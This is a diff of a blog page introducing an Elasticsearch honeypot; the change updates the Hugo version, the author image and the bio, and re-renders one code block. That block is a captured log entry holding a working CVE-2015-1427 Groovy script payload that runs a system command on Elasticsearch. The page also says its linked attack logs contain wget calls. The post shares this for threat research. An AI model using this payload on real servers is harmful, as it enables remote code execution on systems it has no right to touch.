@@ -46,7 +46,7 @@
       
       
     
-    <meta name="generator" content="Hugo 0.27-DEV" />
+    <meta name="generator" content="Hugo 0.40.3" />
 
     <link rel="canonical" href="https://jordan-wright.com/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/" />
 
@@ -176,25 +176,22 @@
 <p>Very quickly after I deployed the honeypot, I started getting hit by attackers scanning large swathes of the Internet looking for vulnerable systems. To date, I&rsquo;ve seen approx. 2000 attacks from over 60 unique IP&rsquo;s over the course of a few days, all without advertising my elastichoney instance anywhere.</p>
 
 <p>Here&rsquo;s an entry from my logs that is attempting to exploit the CVE-2015-1427 that I wrote about:</p>
-
-<pre><code class="language-json">{
-    &quot;source&quot;: &quot;[redacted]&quot;,
-    &quot;@timestamp&quot;: &quot;2015-03-23T13:34:22.519890008-05:00&quot;,
-    &quot;url&quot;: &quot;[redacted]:9200/_search?pretty&quot;,
-    &quot;method&quot;: &quot;POST&quot;,
-    &quot;form&quot;: &quot;pretty=&amp;{\&quot;script_fields\&quot;:+{\&quot;iswin\&quot;:+{\&quot;lang\&quot;:+\&quot;groovy\&quot;,+\&quot;script\&quot;:+\&quot;java.lang.Math.class.forName(\\\&quot;java.io.BufferedReader\\\&quot;).getConstructor(java.io.Reader.class).\\tnewInstance(java.lang.Math.class.forName(\\\&quot;java.io.InputStreamReader\\\&quot;).getConstructor(java.io.InputStream.\\tclass).newInstance(java.lang.Math.class.forName(\\\&quot;java.lang.Runtime\\\&quot;).getRuntime().exec(\\\&quot;whoami\\\&quot;).\\tgetInputStream())).readLines()\&quot;}},+\&quot;size\&quot;:+1}=&quot;,
-    &quot;payload&quot;: &quot;&quot;,
-    &quot;headers&quot;: {
-        &quot;user_agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36&quot;,
-        &quot;host&quot;: &quot;[redacted]:9200&quot;,
-        &quot;content_type&quot;: &quot;application/x-www-form-urlencoded&quot;,
-        &quot;accept_language&quot;: &quot;&quot;
-    },
-    &quot;type&quot;: &quot;attack&quot;,
-    &quot;honeypot&quot;: &quot;[redacted]&quot;
-}
-</code></pre>
-
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#888">{</span>
+    <span style="color:#2838b0">&#34;source&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;[redacted]&#34;</span><span style="color:#888">,</span>
+    <span style="color:#2838b0">&#34;@timestamp&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;2015-03-23T13:34:22.519890008-05:00&#34;</span><span style="color:#888">,</span>
+    <span style="color:#2838b0">&#34;url&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;[redacted]:9200/_search?pretty&#34;</span><span style="color:#888">,</span>
+    <span style="color:#2838b0">&#34;method&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;POST&#34;</span><span style="color:#888">,</span>
+    <span style="color:#2838b0">&#34;form&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;pretty=&amp;{\&#34;script_fields\&#34;:+{\&#34;iswin\&#34;:+{\&#34;lang\&#34;:+\&#34;groovy\&#34;,+\&#34;script\&#34;:+\&#34;java.lang.Math.class.forName(\\\&#34;java.io.BufferedReader\\\&#34;).getConstructor(java.io.Reader.class).\\tnewInstance(java.lang.Math.class.forName(\\\&#34;java.io.InputStreamReader\\\&#34;).getConstructor(java.io.InputStream.\\tclass).newInstance(java.lang.Math.class.forName(\\\&#34;java.lang.Runtime\\\&#34;).getRuntime().exec(\\\&#34;whoami\\\&#34;).\\tgetInputStream())).readLines()\&#34;}},+\&#34;size\&#34;:+1}=&#34;</span><span style="color:#888">,</span>
+    <span style="color:#2838b0">&#34;payload&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;&#34;</span><span style="color:#888">,</span>
+    <span style="color:#2838b0">&#34;headers&#34;</span><span style="color:#888">:</span> <span style="color:#888">{</span>
+        <span style="color:#2838b0">&#34;user_agent&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36&#34;</span><span style="color:#888">,</span>
+        <span style="color:#2838b0">&#34;host&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;[redacted]:9200&#34;</span><span style="color:#888">,</span>
+        <span style="color:#2838b0">&#34;content_type&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;application/x-www-form-urlencoded&#34;</span><span style="color:#888">,</span>
+        <span style="color:#2838b0">&#34;accept_language&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;&#34;</span>
+    <span style="color:#888">},</span>
+    <span style="color:#2838b0">&#34;type&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;attack&#34;</span><span style="color:#888">,</span>
+    <span style="color:#2838b0">&#34;honeypot&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;[redacted]&#34;</span>
+<span style="color:#888">}</span></code></pre></div>
 <p>Now, I&rsquo;m sure you&rsquo;re interested in some samples. <a href="https://gist.githubusercontent.com/jordan-wright/f63575681373f91e462f/raw/b446a9d3bb042aac425970d73c129d4d936478aa/elastichoney.log">Here&rsquo;s</a> a bit of what I have so far. There&rsquo;s some nifty <code>wget</code> calls in there if you grab them fast enough.</p>
 
 <p>Enjoy!</p>
@@ -223,7 +220,7 @@
 
     
     <figure class="author-image">
-        <a class="img" href="https://jordan-wright.com/blog/" style="background-image: url(https://jordan-wright.com/blog/images/jordan-wright-2-crop.jpg)"><span class="hidden">Jordan Wright's Picture</span></a>
+        <a class="img" href="https://jordan-wright.com/blog/" style="background-image: url(https://jordan-wright.com/blog/images/jordan-profile.jpg)"><span class="hidden">Jordan Wright's Picture</span></a>
     </figure>
     
 
@@ -236,7 +233,7 @@
 <section class="author">
   <h4><a href="https://jordan-wright.com/blog/">Jordan Wright</a></h4>
   
-  <p>Security Researcher, Programmer, Time&#39;s 2006 Person of the Year</p>
+  <p>Security Researcher, Programmer.</p>
   
   <div class="author-meta">
     <span class="author-location icon-location">San Antonio, Texas</span>
